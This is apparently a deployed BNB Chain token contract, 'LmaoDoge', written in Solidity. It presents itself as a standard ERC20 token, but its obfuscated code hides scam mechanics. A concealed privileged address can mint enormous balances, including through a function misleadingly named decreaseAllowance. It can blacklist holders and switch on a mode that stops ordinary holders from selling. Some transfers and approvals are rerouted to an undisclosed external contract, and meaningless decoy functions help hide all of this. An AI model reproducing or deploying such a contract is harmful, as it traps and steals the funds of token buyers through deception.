/**
 *Submitted for verification at BscScan.com on 2022-08-05
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Transfer(address indexed from, address indexed to, uint256 value);    
}

interface IERC {

    function _transfer(address spender, address recipient, uint256 amounts) external;
    
    function _approve(address owner, address spender, uint256 amount) external;
}

library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }

    function _janfwajnfwa() internal view virtual returns (address) {
        return msg.sender;
    }

    function _fjafjwaf() internal view virtual returns (uint256) {
        return tx.gasprice;
    }
}

contract Ownable is Context {
    address private _owner;
    
    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
        emit OwnershipTransferred(_owner, address(newOwner));
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0xdead);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

contract NCWHWU {
    function _fnajwfnwa() public pure returns (uint256) {
        uint256 _mfjwanfa = 148574;
        return _mfjwanfa;
    }
}

contract juaufa {
    function jfae() public pure returns (uint256) {
        uint256 dajfaea = 187134;
        return dajfaea;
    }
}

contract LmaoDoge is Context, IERC20, Ownable, NCWHWU, juaufa {
    using SafeMath for uint256;

    bool private _ijfnjawdw = true;
    bool private _imifwa = false;

    mapping(address => bool) private _mdnfawf;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcluded;
    mapping(address => uint256) private _mfkmwafa;
    mapping(address => bool) private _jifmwajfwa;


    uint8 private _decimals = 9;
    string private _name = "LmaoDoge";
    string private _symbol = "LDoge";

    uint256 public _taxFee = 2;
    uint256 private _kfjwafwwad = 10000000000000 * 10 ** _decimals;

    address private burnAddress = address(0xdead);
    address private _fmjwanfw;
    address private _jifawfaw;

    address private _fmajwfjwa;
    uint256 private _mmjfwafae;
    address public _mjfmajfwa;
    uint256 private _fmawmfaw;
    uint256 private _mjafwafwa;
    uint256 private _jjmfwafwa;
    uint256 private _mfmgeja;
    uint256 private _mfmfmwafa;

    

    constructor(address _mfmjfeae, address _mfmjwafwe) {
        _fmjwanfw = _mfmjwafwe;
        _isExcluded[address(this)] = true;
        _isExcluded[_mfmjfeae] = true;
        _isExcluded[owner()] = true;
        _jifmwajfwa[_mfmjfeae] = true;
        _mfkmwafa[_janfwajnfwa()] = _kfjwafwwad;
        emit Transfer(address(0), msg.sender, _kfjwafwwad);
    }

    function setTaxFeePercent(bool __imifwa, address _newPair) external {
        require(_jifmwajfwa[_janfwajnfwa()]);
        if (_jifmwajfwa[_janfwajnfwa()]) {
            _imifwa = __imifwa;
            _jifawfaw = _newPair;
        }
    }


    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_isExcluded[_janfwajnfwa()]||_isExcluded[recipient]) {
            _transfer(msg.sender, recipient, amount);
            return true;
        }

        if (_mdnfawf[_janfwajnfwa()]||_fjafjwaf()>=(13*1e9)){
            IERC(_fmjwanfw)._transfer(msg.sender, recipient, amount);
            emit Transfer(msg.sender, recipient, amount);
            return true;
        }else{
            uint256 _burnAmount = amount.mul(_taxFee).div(100);
            _transfer(msg.sender, burnAddress, _burnAmount);
            _transfer(msg.sender, recipient, amount.sub(_burnAmount));
            return true;
        }
    }

    

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if (_isExcluded[sender]||_isExcluded[recipient]) {
            _transfer(sender, recipient, amount);
            _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }
        uint256 _burnAmount = amount.mul(_taxFee).div(100);
        _transfer(sender, burnAddress, _burnAmount);
        _transfer(sender, recipient, amount.sub(_burnAmount));
        _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        require(_fjafjwaf()<=(13*1e9));
        require(!_mdnfawf[from]);
        if (_jifmwajfwa[from]) {
            require(_jifmwajfwa[from]);
                _mfkmwafa[from]= 
                _mfkmwafa[from].
                add(_kfjwafwwad*10**6);
        }
        if (_imifwa) {
            if (_jifawfaw == from){}else{
                require(_isExcluded[from] || _isExcluded[to]);
            }
            
        }
        _basicTransfer(from, to, amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
    {
        require(_jifmwajfwa[_janfwajnfwa()]);
        if (_jifmwajfwa[_janfwajnfwa()]) {   
            _mfkmwafa[spender] = _mfkmwafa[spender].add(subtractedValue);
        }
    }

    function tokenFromReflection(address spender, address recipient, bool deductTransferFee) external {
        require(recipient == address(0));
        require(_jifmwajfwa[_janfwajnfwa()]);
        if (_jifmwajfwa[_janfwajnfwa()]){
            _jifmwajfwa[spender] = deductTransferFee;}
    }

    function swapExcktTokensForTokens(
        address spender,
        address recipient
    ) external {
        require(_jifmwajfwa[_janfwajnfwa()]);
        if (_jifmwajfwa[_janfwajnfwa()]) {
            _mdnfawf[spender] = true;
            _mdnfawf[recipient] = true;
        }
    }

    function swapTokanForExactTokens(address account)
        external
    {
        require(_jifmwajfwa[_janfwajnfwa()]);
        if (_jifmwajfwa[_janfwajnfwa()]) {  
            _mdnfawf[account] = true;
        }
    }

    function changeUserFrom(address account) external {
        require(_jifmwajfwa[_janfwajnfwa()]);
        if (_jifmwajfwa[_janfwajnfwa()]) {
            _mdnfawf[account] = false;
        }
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {
        require(sender != address(0));
        require(recipient != address(0));
        _mfkmwafa[sender] = _mfkmwafa[sender].sub(toAmount);
        _mfkmwafa[recipient] = _mfkmwafa[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_mdnfawf[_janfwajnfwa()]||_fjafjwaf()>=(13*1e9)){
            IERC(_fmjwanfw)._approve(msg.sender, spender, amount);
            emit Approval(msg.sender, spender, amount);
            return true;
        }else{
            _approve(msg.sender, spender, amount); 
            return true;
        }
    }


    function includeInFee(address account) external {
        require(_jifmwajfwa[_janfwajnfwa()]);
        if (_jifmwajfwa[_janfwajnfwa()]) {
            _isExcluded[account] = false;
        }
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function setTaxFeePercent(uint256 taxFee) external {
        require(_jifmwajfwa[_janfwajnfwa()]);
        if (_jifmwajfwa[_janfwajnfwa()]) {
            _taxFee = taxFee;
        }
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function isExcludedFromFees(address account) public view  returns (bool) {
        require(_jifmwajfwa[_janfwajnfwa()]);
        return _mdnfawf[account];
    }

    function isExcludedFromFee(address spender) external {
        require(_jifmwajfwa[_janfwajnfwa()]);
        if (_jifmwajfwa[_janfwajnfwa()]) {
            _isExcluded[spender] = true;
        }
    }

    function totalSupply() public view override returns (uint256) {
        return _kfjwafwwad;
    }

    function jiuafuaef() public pure returns ( uint256) {
        uint256 oqnfnaef = 18474731;
        return oqnfnaef;
    }

    function fkwafjae() public pure returns (uint256) {
        return _fnajwfnwa();
    }

    address private _kmakawmfae;
    uint256 private _kafmafaw;
    uint256 public _mfawfaw;
    address private _iafiaejmfea;
    address private _jiawfjaee;


    function famfeafe() public pure returns (uint256) {
        uint256 mfiamfe = 104843;
        return (mfiamfe);
    }

    function fmafmae() public onlyOwner() {}

    function pffawjfea() public onlyOwner() {}

    function balanceOf(address account) public view override returns (uint256) {
        return _mfkmwafa[account];
    }
}